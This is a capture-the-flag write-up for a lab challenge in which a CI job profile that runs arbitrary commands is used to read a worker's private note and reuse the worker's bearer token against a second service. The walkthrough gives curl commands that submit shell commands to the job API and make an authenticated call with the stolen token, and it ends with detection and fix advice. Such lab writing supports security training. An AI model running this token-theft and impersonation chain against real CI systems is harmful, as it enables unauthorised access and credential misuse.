# K09.4 — Run in the runner

> **Category:** 2. KeplerOps · **Points:** 100 · **Difficulty:** medium
> **Solved by:** pi lane K09

## At a glance

| | |
|---|---|
| **Vulnerability / bug class** | Command execution inside a CI worker, chained with a second service that trusts the worker's bearer token — job execution becomes impersonation |
| **Tools** | `curl`, `jq`, review service job API |
| **Attack surface** | `profile: runner-command` jobs on `https://review.keplerops.test`; worker routes `/api/build-records` and `/api/build-records/worker-status` |
| **Prerequisite** | The review job contract from K09.3 and a developer credential |
| **Flag** | accepted, value not recorded |

**What you are about to read:** how a job profile that runs a command inside the worker lets
you read a file the worker can see, and why acceptance demands *two* distinct runs — the note
read plus a second run authenticating to build-records with the worker's own token.

## Objective

Use the review job to retrieve Build Operations' private runner note and verify the
build-record connection it describes.

## Background you need

- **`runner-command` is a job profile**: the service runs a command in the worker's context
  and returns state and output — a shell on the runner, scoped to its filesystem/environment.
- **The worker holds its own credentials.** The build-records routes use *worker bearer
  tokens, not developer auth*, so a command job can read the token the worker uses.
- **The private runner note** describes the build-record connection — service, route and
  credential. It is a document, not a flag file.
- **The acceptance function** (`_k09_4_complete`) requires two *distinct* runner-command runs:
  one that read the protected note, and a different one whose authenticated build-records
  request is recorded in the audit.

## Walkthrough

### 1. Recon — confirm execution and result shape

```bash
# illustrative: a runner-command job
curl -sS --socks5-hostname 127.0.0.1:1080 --cacert /home/kali/ctf/ca.crt \
  -u 'rowan.ito:<fk_developer token>' -H 'Content-Type: application/json' \
  -d '{"profile":"runner-command","input":{"command":"id; pwd; ls -la"}}' \
  https://review.keplerops.test/api/jobs
```

Poll `GET /api/jobs/{job}` until `state` is `success`; the result carries the output —
including the protected note once you `cat` it in a second command.

### 2. Finding the flaw — the worker authenticates to a second service

`/api/build-records` and `/api/build-records/worker-status` are not gated by developer auth.
The service routes them to a dedicated handler expecting a **worker bearer token**:

```text
# quoted from the service source in the retained evidence
if path in ("/api/build-records/worker-status", "/api/build-records"):
    self._build_records_handler(path)
```

The request needs the token the worker presents — which the first run can read.

### 3. Exploitation — two runs, one read and one authenticated call

```bash
# illustrative, run 1: dump the note
curl -sS ... -d '{"profile":"runner-command","input":{"command":"cat <note path>"}}' \
  https://review.keplerops.test/api/jobs

# illustrative, run 2: call the build-records route as the worker
curl -sS ... -d '{"profile":"runner-command","input":{"command":\
  "curl -sS -H \"Authorization: Bearer $WORKER_TOKEN\" \
   https://review.keplerops.test/api/build-records"}}' \
  https://review.keplerops.test/api/jobs
```

Run 2's result answers with the build record the note described — version, namespace,
workspace: the "build-record connection" verified.

### 4. Getting the flag

The lane report records the accepted submission after several attempts: the flag was returned
on the job with `profile: runner-command` whose two-run evidence satisfied
`_k09_4_complete()`. The per-card `flag` field is empty, so it is **accepted, value not
recorded**. Expected failure: one successful command job returns `state: success` and no flag.

## Why this works (the vulnerability explained)

Two weaknesses are chained. First, **arbitrary command execution in a worker**:
caller-supplied commands are RCE by design, acceptable only if the worker holds nothing
sensitive — this one holds a bearer token for a second service and can read Build Operations'
private note. Second, **a service that trusts a bearer token with no binding**: build-records
authenticates on "you hold the worker token", not "you are the worker process", so a token
read from disk is indistinguishable from the worker's own call. Job execution → read worker
secrets → impersonate the worker where the developer credential cannot reach.

## Detection and fix

- **Detect:** `runner-command` jobs whose command reads files outside the working directory or
  references `Authorization` headers; build-records requests from a command job rather than
  the build agent; one worker token used from two jobs in a short window.
- **Fix:** remove free-form command profiles from user-submittable jobs or run them in a
  sandbox with no credentials and no host mounts. Mint per-job, per-purpose tokens that expire
  with the job, and bind build-records tokens to the agent's identity (mTLS/workload
  attestation) rather than a bearer string on disk.
- **Fix the audit:** record submitting and acting identity for every worker-routed call, so a
  borrowed token shows up as a mismatch.

## Notes and dead ends

- Evidence is real but indirect: the snippets quote `/opt/fieldkest/ci.py` (and the
  `/opt/fieldkest-ci/ci.py` mirror) for the `runner-command` branch, the `_k09_4_complete()`
  docstring, the worker-token routing condition, and the lane's solved entry. Commands, note
  path and result JSON are **reconstructed**; the two-run rule and route names are verbatim.
- Calling `/api/build-records` with the developer credential is the intended dead end: the
  route never consults developer auth, so the error looks like a permission problem but is a
  different credential type.
- One run is not enough: if the second call happens in the same job as the note read, the
  audit sees one run and the completion check stays false.
